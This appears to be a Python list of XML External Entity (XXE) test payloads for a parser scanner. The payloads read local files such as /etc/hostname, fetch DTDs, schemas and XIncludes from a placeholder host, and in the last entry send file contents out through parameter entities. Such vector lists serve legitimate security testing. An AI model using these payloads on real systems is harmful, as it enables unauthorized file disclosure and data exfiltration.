vectors = [
'''<!DOCTYPE data [<!ELEMENT data (#ANY)>]>
<data>42</data>''',

'''<!DOCTYPE data [
    <!ELEMENT data (#ANY)>
    <!ENTITY foo "bar">
    ]>
<data>&foo;</data>''',

'''<!DOCTYPE data [
  <!ENTITY % foo "<!ENTITY bar 'baz'>">
  %foo;
]>
<data>&bar;</data>''',

'''<!DOCTYPE Response [<!ENTITY ext ${SYSPUB} "file:///sys/power/image_size" >]>
<Response>&ext;</Response>''',

'''<!DOCTYPE data [
<!ENTITY dos ${SYSPUB} "${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}/xmlelement.xml" >
]>
<data>&dos;</data>''',

'''<!DOCTYPE data [
<!ENTITY dos ${SYSPUB} "${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}/xmlattribute.xml" >
]>
<data attrib='&dos;'/>''',

'''<!DOCTYPE data ${SYSPUB} "${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}/ext.dtd" >
<data>sometext</data>''',

'''<!DOCTYPE data [
<!ENTITY % remote ${SYSPUB} "${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}/parameterEntity.dtd">
%remote;
]>
<data>&ent;</data>''',

'''<ttt:data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:ttt="http://example.com/attack" xsi:schemaLocation="${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}/xmlSchema.xsd">42</ttt:data>''',

'''<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}/xInclude.txt" parse="text"></xi:include></data>''',

'''<data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}">42</data>''',

'''<!ENTITY % payload ${SYSPUB} "file:///etc/hostname">
<!ENTITY % param1 '<!ENTITY % external ${SYSPUB} "file:///nothere/%payload;">'>
%param1;
%external;''',

'''<!ENTITY % payload ${SYSPUB} "file:///etc/hostname">
<!ENTITY % param1 '<!ENTITY % external ${SYSPUB} "${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}/%payload;">'>
%param1;
%external;'''
]